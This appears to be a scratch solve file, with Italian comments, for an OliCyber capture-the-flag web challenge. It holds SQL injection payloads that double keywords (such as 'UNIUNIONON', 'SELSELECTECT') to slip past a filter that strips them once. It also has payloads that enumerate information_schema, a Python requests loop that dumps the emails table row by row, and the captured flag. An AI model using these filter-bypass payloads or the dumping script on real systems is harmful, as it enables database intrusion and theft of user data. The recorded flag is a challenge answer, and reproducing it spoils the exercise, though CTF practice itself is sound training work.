# aaaaaaaaaa' or SUBSTRING(email,0,5) = 'flaflagg{'-- - vede solamente il primo risultato e mi ignora il secondo
# aaaaadaa' or SUBSTRING(email,1,5) = 'flaflagg{'-- -   non capisco perche non funzioni, in teoria dovrebbe matchare la flag
 
# ANY (SELSELECTECT email frofromm emails whewherere email = "ciao" )  --  è ancora racchiuso dalla stringa


# aaaaa' UNIUNIONON (SELSELECTECT email frofromm emails whewherere SUBSTRING(email,0,5) = 'flaflagg{' )


# aaaa@gmail.com AND 1=2 UNION SELECT concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=challange --
# dump di tutto questo table: aaaaa' UNIUNIONON (SELSELECTECT * frofromm emails) LIMILIMITT 10 OFFSEOFFSETT {i} -- 
import requests

url = 'http://no-time.challs.olicyber.it/'
i = 0
while True:
	res = requests.post(url, data = {"email": f"aaaaa' UNIUNIONON (SELSELECTECT * frofromm emails) LIMILIMITT 10 OFFSEOFFSETT {i} -- "}).text

	index = res.find('La mail')
	stopCondition = res.find("La mail è stata inserita nel database!")
	if stopCondition != -1:
		break 
	print(res[index:index+80], f"index è {i}") 
	i += 1



aaaaa' UNIUNIONON (SELSELECTECT table_name frofromm information_schema.TABLES) LIMILIMITT 10 OFFSEOFFSETT 1-- -
se mando questo trovo il table dove si trova la flag:
qua_trovi_la_tua_flag è la table buona


flag{1_d0n7_w4n7_70_w41t_ju57_61v3_m3_fl4g!}